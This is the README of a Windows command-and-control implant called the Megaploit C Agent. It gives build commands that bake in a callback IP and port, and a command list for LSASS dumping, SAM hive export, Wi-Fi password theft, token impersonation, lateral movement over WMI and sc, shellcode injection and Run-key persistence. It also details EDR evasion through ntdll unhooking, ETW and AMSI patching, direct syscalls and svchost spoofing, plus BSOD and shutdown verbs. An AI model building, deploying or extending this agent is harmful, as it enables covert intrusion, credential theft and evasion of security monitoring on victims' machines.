# C-remote-shell — Megaploit C Agent

A Windows-native C2 agent for the [Megaploit](https://github.com/hagba/Megaploit) framework.
Fully encrypted, authenticated, and evasion-hardened — designed to pair with
`python server.py -lh <IP> -p <PORT> --tls`.

> **This is an active Work In Progress**. We recently decided to revive this codebase, it will take a while to get all the bugs ironed out and all units working properly.
> Undocumented Windows API calls are involved in this project (RtlAdjustPrivilege, NtRaiseHardError, etc...) these are just for a Proof of Concept, these calls may be subject to change at any point with every new release of the Windows NT Kernel.

---

## Table of Contents

1. [Quick Start](#quick-start)
2. [Commands Reference](#commands-reference)
3. [Evasion & Stealth](#evasion--stealth)
4. [Security Architecture](#security-architecture)
5. [Building the Agent](#building-the-agent)
6. [Project Layout](#project-layout)
7. [Configuration Reference](#configuration-reference)
8. [Protocol Wire Format](#protocol-wire-format)
9. [What Changed](#what-changed)
10. [Adding a New Command](#adding-a-new-command)

---

## Quick Start

### 1. Generate a TLS certificate and start the Megaploit listener

```bash
# from the Megaploit repo root
python -c "import os,binascii; open('secret.key','wb').write(binascii.hexlify(os.urandom(32)))"
python server.py -lh 192.168.1.226 -p 50005 --tls
```

### 2. Build the agent

```powershell
# MSYS2 UCRT64 on Windows (recommended)
$env:PATH = "C:\msys64\ucrt64\bin;$env:PATH"
cd C-remote-shell
mingw32-make C2_IP=192.168.1.226 C2_PORT=50005
```

The output is `megaploit_c_agent.exe` (~60 KB stripped).

The `secret.key` file must be present next to the EXE when it runs (or in
the directory it was launched from — the agent resolves the absolute path at
startup before any migration).

### 3. Catch the session

Run `megaploit_c_agent.exe` on the target. The agent connects back, completes
the TLS + HMAC handshake, and a session appears in the Megaploit console.

---

## Commands Reference

### Native C handlers (direct Windows API — no child process)

| Verb | Args | Description |
|---|---|---|
| `sysinfo` | — | OS version, hostname, username, arch, CWD |
| `os_info` | — | Build number, install date, uptime |
| `cd` | `<path>` | `SetCurrentDirectoryA` |
| `ls` | `[path]` | Directory listing with size and date |
| `ps` | — | Running processes: PID, PPID, name, arch, owner |
| `kill` | `<pid>` | `TerminateProcess` |
| `env` | `[filter]` | Dump environment variables (optional substring filter) |
| `getclip` | — | Read clipboard text |
| `setclip` | `<text>` | Write clipboard text |
| `idle_time` | — | Seconds since last user input (`GetLastInputInfo`) |
| `lock_screen` | — | `LockWorkStation` |
| `active_windows` | — | Titles of all visible top-level windows |
| `msgbox` | `<title> <message>` | Pop a dialog via `mshta.exe` (detached) |
| `upload` | `<filename>` | Receive a file from C2 and write to disk |
| `download` | `<path>` | Read a file from disk and send to C2 |
| `persist` | `<regkey> <filename>` | Copy EXE to `%APPDATA%\<filename>`, set HKCU Run key |
| `self_destruct` | — | Remove run key, schedule EXE deletion, exit |

### Lateral movement & credential access

| Verb | Args | Description |
|---|---|---|
| `dump_lsass` | — | `MiniDumpWriteDump` lsass → `%TEMP%\lsass.dmp`; pull with `download` |
| `token_impersonate` | `<pid>` | Steal + impersonate the primary token from a process |
| `lateral_wmi` | `<host> <cmd>` | Remote exec via `wmic Win32_Process.Create` |
| `lateral_sc` | `<host> <cmd>` | Remote exec via `sc create/start/delete` (runs as SYSTEM) |

### Injection & migration

| Verb | Args | Description |
|---|---|---|
| `inject` | `<pid> <hex>` | Inject raw shellcode (hex string) into a process via NT syscalls |
| `migrate` | `<pid>` | Reflective PE injection into `<pid>`, then `ExitProcess(0)` |

### In-process evasion (live verbs)

| Verb | Description |
|---|---|
| `etw_patch` | Patch `EtwEventWrite` → `ret` in the current process |

### Power / destructive

| Verb | Wire form | Description |
|---|---|---|
| `forceoff` | `forceOff()` | `NtSetSystemPowerState` + `NtShutdownSystem` |
| `bluescreen` | `blueScreen()` | `NtRaiseHardError(STATUS_ASSERTION_FAILURE)` — kernel BSOD |

### Shell-command fallbacks (`cmd.exe`)

These verbs are recognised by name and translated into the corresponding
Windows shell command — no native API call:

| Verb | Shell command run |
|---|---|
| `users` | `net user` |
| `logged_in` | `query user` |
| `services [filter]` | `sc query state= all [| findstr <filter>]` |
| `scheduled_tasks` | `schtasks /query /fo LIST` |
| `installed_software` | `wmic product get Name,Version,InstallDate` |
| `startup_items` | `reg query HKCU\...\Run` + `HKLM\...\Run` |
| `wifi_passwords` | `netsh wlan show profile name=... key=clear` |
| `hashdump` | `reg save HKLM\SAM/SYSTEM → %TEMP%` |
| `netstat` | `netstat -ano` |
| `arp` | `arp -a` |
| `ifconfig` | `ipconfig /all` |
| `routes` | `route print` |
| `dns_query <host>` | `nslookup <host>` |
| `sandbox_check` | CPU cores + disk size + uptime + debugger check |
| `cat <file>` | `type "<file>"` |
| `mkdir <path>` | `mkdir "<path>"` |
| `rm <path>` | `del /f /q` or `rmdir /s /q` depending on target type |
| `find_files <path> [pat]` | `dir /s /b "<path>\<pat>"` |
| `file_hash <path>` | `certutil -hashfile "<path>" SHA256` |
| `tail <file> [n]` | `Get-Content '<file>' -Tail <n>` (PowerShell) |
| `write_file <path> <content>` | `Set-Content` (PowerShell) |
| `chmod <mode> <path>` | `icacls` (Windows approximation) |
| `find_writable <path>` | `icacls /t | findstr "(W) (M) (F)"` |
| `find_suid` | Lists unquoted service paths (no SUID on Windows) |
| `<anything else>` | Passed verbatim to `_popen("cmd /c ...")` |

### Not-supported stubs

The following Python-agent-only verbs return a clear error instead of hanging:
`screenshot`, `screenrecord`, `screen_stream`, `webcam`, `record`, `mic_level`,
`keylog_*`, `browser_*`, `inject_shellcode`, `dll_inject`, `reverse_shell`,
`socks5`, `portfwd`, `uac_bypass`, `cred_vault`, `ssh_harvest`, `sudo_*`,
`clip_watch`, `notify`, `open_url`, `play_sound`, `set_wallpaper`, `mouse_move`,
`type_keys`, `forkbomb`, `living_off_land`, `zip_download`, `zip_upload`,
`run_psh`, `run_python`, `pty_shell`, `load_extension`, `unload_extension`,
`irb`, `getsystem`, `kiwi`.

---

## Evasion & Stealth

The agent applies multiple independent layers at startup, before the C2
connection is attempted.

### 1. Process-identity spoofing (`client/spoof.c`)

| Technique | API | Effect |
|---|---|---|
| PEB field overwrite | `RTL_USER_PROCESS_PARAMETERS` | Task Manager command-line column, ProcExp Properties > Image show `svchost.exe -k netsvcs -p -s Schedule` |
| Kernel image name | `NtSetInformationProcess(class 49)` | Process Hacker "Image" column shows `svchost.exe` |
| LDR unlink | stub (disabled) | Placeholder; LDR arithmetic proved version-sensitive on Windows 11 builds |

### 2. EDR evasion (`client/evasion.c`)

| Function | What it does |
|---|---|
| `unhook_ntdll()` | Remaps `ntdll.dll` `.text` section fresh from disk, overwriting any EDR inline hooks. Called **first** so subsequent NT syscall resolutions get clean stubs. |
| `etw_patch()` | Overwrites `EtwEventWrite` prologue with a `ret` stub. Stops Windows Event Tracing telemetry from this process reaching any consumer (Defender, EDR, WEF). |
| `amsi_patch()` | Patches `AmsiScanBuffer` in `amsi.dll` to return `AMSI_RESULT_CLEAN`. Prevents PowerShell / WSH / .NET AMSI content scanning in-process. |

### 3. Auto-migration (`client/inject.c` — `auto_migrate`)

On startup (before the C2 connect loop), the agent:

1. Copies itself to `%TEMP%\RuntimeBroker.exe`
2. Spawns it as a new process (`CREATE_SUSPENDED`)
3. Resumes the suspended process
4. The original process calls `ExitProcess(0)` and vanishes from Task Manager

The running copy is then `RuntimeBroker.exe` in `%TEMP%`, which is harder to
associate with the drop path.

### 4. IAT-free resolution (`client/peb_walk.c`)

`GetModuleHandleA`, `GetProcAddress`, and `LoadLibraryA` are high-signal
imports that every EDR product monitors.  The agent avoids placing them in
its IAT entirely by resolving all sensitive symbols at runtime through a
direct PEB walk.

| Function | What it does |
|---|---|
| `peb_get_module(hash)` | Walks `PEB→Ldr→InMemoryOrderModuleList`, returns the base address of the module whose lowercase name matches a ROR13-DJB2 hash. |
| `peb_get_export(base, hash)` | Walks the PE export directory of a loaded module and returns the VA of the export whose lowercase name matches the hash. |
| `peb_hash_str(s)` | Runtime ROR13-DJB2 hash of an ASCII string (same algorithm used by Metasploit and Cobalt Strike beacon stubs). |

Pre-computed constants (`HASH_NTDLL`, `HASH_KERNEL32`) avoid any string
literals for the most-watched module names.

### 5. Direct syscalls — Hell's Gate / Halo's Gate (`client/syscall.c`)

Even after `unhook_ntdll()` restores clean stubs, an EDR can re-hook at any
time.  The direct-syscall layer bypasses the ntdll layer completely:

**Hell's Gate (clean stub):**
```
[+0]  4C 8B D1        mov  r10, rcx
[+3]  B8 XX XX XX XX  mov  eax, <SSN>   ← SSN read here
[+8]  ...
[+11] 0F 05           syscall
[+13] C3              ret
```
`sc_init()` reads the 4-byte SSN at offset `+4` of each ntdll stub directly.

**Halo's Gate (hooked stub):**
If byte `[+0]` is `0xE9` (a `JMP` — an EDR hook), the SSN cannot be read.
Adjacent stubs have consecutive SSNs, so the code scans neighbouring stubs
at ±32-byte intervals and derives the target SSN as `SSN[neighbour] ± delta`.

| Symbol | SC_ID | Description |
|---|---|---|
| `NtAllocateVirtualMemory` | `SSN_NtAllocateVirtualMemory` | Allocate memory in a remote process |
| `NtWriteVirtualMemory` | `SSN_NtWriteVirtualMemory` | Write shellcode into the allocation |
| `NtProtectVirtualMemory` | `SSN_NtProtectVirtualMemory` | Flip RW → RX after write |
| `NtCreateThreadEx` | `SSN_NtCreateThreadEx` | Start the remote thread |
| `NtReadVirtualMemory` | `SSN_NtReadVirtualMemory` | Read remote process memory |
| `NtClose` | `SSN_NtClose` | Close handles |

`sc_init()` is called once at startup (after `unhook_ntdll()`) and stores
all resolved SSNs.  Inline wrapper functions (`SC_NtAllocateVirtualMemory`,
etc.) provide drop-in replacements matching the standard Nt* signatures.

### 6. Shellcode injection evasion (`client/inject.c`)

- All NT calls go through the direct-syscall trampolines from `syscall.c` —
  no `GetProcAddress`, no `VirtualAllocEx`, no `CreateRemoteThread` in the
  import table.
- Two-phase memory permissions: **RW** (write shellcode) → **RX** (execute). No
  RWX pages ever exist.
- `NtCreateThreadEx` called with `HideFromDebugger` flag.

### 7. Obfuscated sleep (`obfuscate_sleep`)

During reconnect delays the agent XOR-scrambles all private RX pages so memory
scanners see only ciphertext. Falls back to plain `Sleep()` on `BCryptGenRandom`
failure.

---

## Security Architecture

Four layers wrap every byte in transit:

```
TLS 1.2/1.3 (SChannel, AEAD-only)
  └─ HMAC-SHA256 challenge/response  (secret.key, 32 raw bytes)
       └─ Protocol v2 magic-byte echo  (0x4d)
            └─ AES-256-GCM framed messages
                 [uint32-BE length][nonce(12)][ciphertext][GCM-tag(16)]
                 + uint64-BE sequence counter (replay protection)
```

**Layer 1 — TLS**  
`SP_PROT_TLS1_2_CLIENT | SP_PROT_TLS1_3_CLIENT`, `SCH_USE_STRONG_CRYPTO`
(AEAD-only cipher suites), `ISC_REQ_NO_RENEGOTIATION`. Certificate
verification disabled (C2 uses a self-signed cert).

**Layer 2 — HMAC authentication**  
Server sends a 16-byte random challenge. Agent replies with
`HMAC-SHA256(secret_key[32], challenge[16])`. Server drops the connection on
mismatch.

**Layer 3 — Protocol handshake**  
Server sends `0x4d` (`M`). Agent echoes it back. Ensures both ends are
running a compatible Megaploit build.

**Layer 4 — AES-256-GCM framing**  
Every application message is independently encrypted with a fresh 12-byte
nonce. A big-endian 64-bit sequence number is prepended to the plaintext
before encryption; the receiver enforces strict monotonicity (replay protection).
Cached BCrypt key handles (`hAesKeyEnc` / `hAesKeyDec` in `TLS_CONTEXT`) avoid
re-importing the key on every message.

---

## Building the Agent

### Requirements

- **Windows host** with MSYS2 UCRT64 (`C:\msys64\ucrt64\bin` in PATH), **or**
- **Linux / macOS** with `x86_64-w64-mingw32-gcc` (`apt install mingw-w64`)

Link libraries: `Secur32`, `Crypt32`, `ws2_32`, `bcrypt`, `Advapi32`, `User32`

### Option A — MinGW (MSYS2 UCRT64 on Windows, recommended)

```powershell
$env:PATH = "C:\msys64\ucrt64\bin;$env:PATH"
cd C-remote-shell
mingw32-make C2_IP=192.168.1.226 C2_PORT=50005
```

### Option B — MinGW cross-compile (Linux / macOS)

```bash
cd C-remote-shell
make CC=x86_64-w64-mingw32-gcc C2_IP=192.168.1.226 C2_PORT=50005
```

### Option C — MSVC (Developer Command Prompt)

```cmd
cd C-remote-shell
nmake C2_IP=192.168.1.226 C2_PORT=50005
```

### Option D — Direct compiler invocation

```bash
cc -Os -s -DNDEBUG -DUNICODE -D_UNICODE -DSECURITY_WIN32         \
   -ffunction-sections -fdata-sections                            \
   -fno-ident -fno-asynchronous-unwind-tables                     \
   -DC2_IP=\"192.168.1.226\" -DC2_PORT=50005                      \
   client/main.c client/spoof.c client/ntcalls.c client/shell.c  \
   client/handlers_system.c client/handlers_ui.c                  \
   client/handlers_lateral.c client/inject.c client/evasion.c    \
   tls/tls_client.c                                               \
   -o megaploit_c_agent.exe                                       \
   -Wl,--gc-sections -Wl,--strip-all                              \
   -lsecur32 -lcrypt32 -lws2_32 -lbcrypt -ladvapi32 -luser32     \
   -mwindows
```

### Build flags

| Flag | Purpose |
|---|---|
| `-Os` | Optimise for size |
| `-s` | Strip all symbols |
| `-ffunction-sections -fdata-sections` + `--gc-sections` | Dead-code removal at link time |
| `-fno-ident` | Omit GCC version string from binary |
| `-fno-asynchronous-unwind-tables` | Strip `.eh_frame` / `.pdata` (~10–15% size saving) |
| `-mwindows` | GUI subsystem — no console window spawned |
| `-DNDEBUG` | Strip asserts and debug strings |
| `-DUNICODE -D_UNICODE` | Wide-character Windows API |
| `-DSECURITY_WIN32` | Required by `<security.h>` / SChannel |

---

## Project Layout

```
C-remote-shell/
│
├── Makefile                      Auto-detect MSVC/MinGW; targets: client, legacy, server, clean
│
├── client/
│   ├── config.h                  C2 IP/port, key path, buffer sizes (all tuneable constants)
│   ├── main.c                    WinMain: spoof → evasion → auto_migrate → connect loop
│   │
│   ├── spoof.h / spoof.c         Process-identity spoofing (PEB + kernel image name)
│   ├── evasion.h / evasion.c     EDR evasion: unhook_ntdll, etw_patch, amsi_patch
│   ├── ntcalls.h / ntcalls.c     NT native syscall pointer resolution and verification
│   ├── inject.h / inject.c       Shellcode injection, reflective PE migrate, auto_migrate,
│   │                               obfuscated sleep
│   │
│   ├── peb_walk.h / peb_walk.c   PEB-based module enumeration (GetProcAddress replacement)
│   ├── syscall.h / syscall.c     Direct syscall stubs (avoids Win32 wrappers)
│   │
│   ├── shell.h                   Public API: shell_run(TLS_CONTEXT *)
│   ├── shell.c                   Dispatch loop + _json_unwrap + _send_str + _shell_exec
│   ├── shell_internal.h          Shared internal API (handler forward declarations)
│   ├── handlers_system.c         sysinfo, os_info, cd, ls, ps, kill, env,
│   │                               idle_time, lock_screen, active_windows
│   ├── handlers_ui.c             getclip, setclip, msgbox, upload, download,
│   │                               persist, self_destruct
│   ├── handlers_lateral.c        dump_lsass, token_impersonate, lateral_wmi, lateral_sc
│   │
│   ├── loader.h / loader.c       Reflective PE loader stub (position-independent, < 512 B)
│   ├── loader_blob.h             Auto-generated: loader stub as a C byte array
│   └── gen_loader_blob.ps1       PowerShell script that generates loader_blob.h from loader.bin
│
├── tls/
│   ├── tls_client.h              TLS_CONTEXT struct, public API declarations
│   └── tls_client.c              Full TLS + HMAC + AES-GCM implementation (SChannel)
│
├── server/                       Refactored POSIX C2 listener (Linux / macOS)
│   ├── config.h
│   ├── main.c
│   ├── server.h / server.c
│   └── prompt.h / prompt.c
│
├── Source.c                      Legacy monolithic client (kept for `make legacy`)
├── definitions.h                 Shared globals for Source.c
├── serverShell.c                 Legacy POSIX server (kept for `make server-posix-legacy`)
│
└── megaploit_c_agent.exe         Current production build artifact
```

---

## Configuration Reference

All compile-time knobs live in [`client/config.h`](client/config.h).

| Constant | Default | Description |
|---|---|---|
| `C2_IP` | `"192.168.1.226"` | C2 listener address — override via `-DC2_IP=...` |
| `C2_PORT` | `50005` | C2 listener port — override via `-DC2_PORT=...` |
| `RECONNECT_DELAY_SEC` | `10` | Seconds between failed connection retries |
| `SECRET_KEY_PATH` | `"secret.key"` | Relative filename of the HMAC key file |
| `SECRET_KEY_LEN` | `32` | Decoded key length in bytes (file holds 64 hex chars) |
| `SHELL_LINE_BUF` | `4096` | `fgets()` line buffer for `_popen` output |
| `SHELL_RESP_BUF` | `65536` | Initial accumulated response buffer (grows dynamically) |
| `INJECT_MAX_SHELLCODE` | `32768` | Maximum shellcode bytes accepted by `inject` verb |
| `PS_MAX_PROCS` | `512` | Maximum processes listed by `ps` before truncation |

**Secret key format:** The file must contain exactly 64 ASCII hex characters
(lower or upper case, with or without a trailing newline). Generate with:

```python
python -c "import os,binascii; open('secret.key','wb').write(binascii.hexlify(os.urandom(32)))"
```

The same file must be loaded by the Megaploit server (`megaploit/core/crypto.py`).

---

## Protocol Wire Format

All application data flows through four nested layers (innermost first):

### Layer 4 — AES-256-GCM frame

```
Outbound message:
  [uint32-BE  total_len      ]   4 bytes  — length of the rest
  [byte[12]   nonce          ]  12 bytes  — random, fresh per message
  [byte[N]    ciphertext     ]   N bytes  — AES-256-GCM(seq_be64 ++ plaintext)
  [byte[16]   GCM auth tag   ]  16 bytes

Inbound: identical layout.
Sequence number: prepended to plaintext before encryption as a big-endian
uint64. Receiver enforces seq > last_seq (strict monotonicity = replay protection).
```

### Layer 3 — Protocol v2 handshake

```
Server → 0x4d  ('M')
Client → 0x4d  (echo)
```

### Layer 2 — HMAC-SHA256 authentication

```
Server → 16 random bytes  (challenge)
Client → HMAC-SHA256(secret_key[32], challenge[16])  = 32 bytes
Server drops connection if response does not match.
```

### Layer 1 — TLS 1.2 / 1.3

SChannel with `SP_PROT_TLS1_2_CLIENT | SP_PROT_TLS1_3_CLIENT`,
`SCH_USE_STRONG_CRYPTO`, `ISC_REQ_NO_RENEGOTIATION`.

---

## What Changed

### Refactor — source split

The original codebase was a single monolithic `Source.c` (~2 000 lines).
The current layout splits it by responsibility:

| Old | New |
|---|---|
| `Source.c` (everything) | `main.c` + `spoof.c` + `shell.c` + `handlers_*.c` + `inject.c` + `evasion.c` + `ntcalls.c` |
| Inline spoof functions in `main.c` | `client/spoof.c` / `client/spoof.h` |
| All handler bodies in `shell.c` | `handlers_system.c`, `handlers_ui.c`, `handlers_lateral.c` |

### New features

- **`spoof.c`** — PEB user-mode field overwrite + `NtSetInformationProcess(49)`
  kernel image name spoof (visible in Process Hacker "Image" column)
- **`evasion.c`** — `unhook_ntdll`, `etw_patch`, `amsi_patch`
- **`auto_migrate`** — copies self to `%TEMP%\RuntimeBroker.exe` and relaunches
  before the C2 connect loop; original process exits
- **`obfuscate_sleep`** — XOR-scrambles in-memory RX pages during reconnect delays
- **`dump_lsass`** — `MiniDumpWriteDump` via dynamically loaded `dbghelp.dll`
- **`token_impersonate`** — `OpenProcessToken` + `DuplicateTokenEx` + `ImpersonateLoggedOnUser`
- **`lateral_wmi`** — remote exec via `wmic /node Win32_Process.Create`
- **`lateral_sc`** — remote exec via `sc create/start/delete` (SYSTEM on target)
- **`idle_time`**, **`lock_screen`**, **`active_windows`** — new UI/recon verbs
- **`getclip`** / **`setclip`** — clipboard read/write
- **`msgbox`** — detached `mshta.exe` dialog (no parent link in Task Manager)
- **Reflective loader** — `client/loader.c` + `gen_loader_blob.ps1` pipeline

### Bug fixes (vs original `Source.c`)

| # | Bug | Fix |
|---|---|---|
| 1 | `checkNtCalls()` return logic backwards — `if (!ntcalls_load()) continue` treated failure as success | Inverted condition |
| 2 | `CreateMutexA` passed a wide-string literal (UB under `-DUNICODE`) | Changed to `CreateMutexA(NULL, FALSE, "consoleShell")` |
| 3 | `WSAStartup(MAKEWORD(2, 0), ...)` requested Winsock 2.0 | Changed to `MAKEWORD(2, 2)` |
| 4 | `fclose()` called on a `_popen()` handle (UB — must use `_pclose`) | Fixed to `_pclose` |
| 5 | `forceOff()` `strncmp` length was `11` (one byte short, matched `forceOff(` without `)`) | Changed to `10` |
| 6 | Empty response frame (`tls_send_msg("", 0)`) blocked the server reader | Now sends a single space instead of zero bytes |

### Bug fixes (vs original `serverShell.c`)

| # | Bug | Fix |
|---|---|---|
| 1 | `sAddress.sin_addr.s_addr` never assigned — socket bound to 0.0.0.0 regardless of `-h` flag | Added `inet_pton` assignment |
| 2 | `forceOff()` `strncmp` length was `12` | Changed to `10` |
| 3 | Dangling `else` caused `blueScreen()` branch to fall through and call `recv()` | Added braces |
| 4 | `write()` sent full 1024-byte buffer including NUL padding | Changed to `write(fd, buf, strlen(buf))` |
| 5 | `socket()` and `accept()` return values unchecked | Added checks |
| 6 | `write()` / `recv()` return values unchecked | Added checks |
| 7 | Listening socket never closed | Added `close(listenSock)` after `accept()` |
| 8 | Unreachable `jmp:` label after `return` | Removed |

---

## Adding a New Command

1. **Pick a file** — system/recon verb → `handlers_system.c`,
   UI/file verb → `handlers_ui.c`, lateral/cred verb → `handlers_lateral.c`,
   or keep it inline in `shell.c` for trivial one-liners.

2. **Write the handler:**

```c
// handlers_system.c (for example)
void _handle_myverb(TLS_CONTEXT *pTls, const char *args)
{
    // ... do work ...
    _send_str(pTls, "[+] result");
}
```

3. **Declare it in `shell_internal.h`:**

```c
void _handle_myverb(TLS_CONTEXT *pTls, const char *args);
```

4. **Add a dispatch branch in `shell.c`** inside `shell_run()`:

```c
if (cbCmd >= 8 && strncmp("myverb ", cmd, 7) == 0) {
    char args[256] = {0};
    strncpy(args, cmd + 7, sizeof(args) - 1);
    free(pCmd); pCmd = NULL;
    _handle_myverb(pTls, args);
    continue;
}
```

5. **Build and test:**

```powershell
mingw32-make C2_IP=192.168.1.226 C2_PORT=50005
```

No other files need to change. The Megaploit C2 probe (`megaploit/core/c_probe.py`)
discovers new verbs automatically by scanning the `strncmp()` calls in the
compiled binary at runtime.
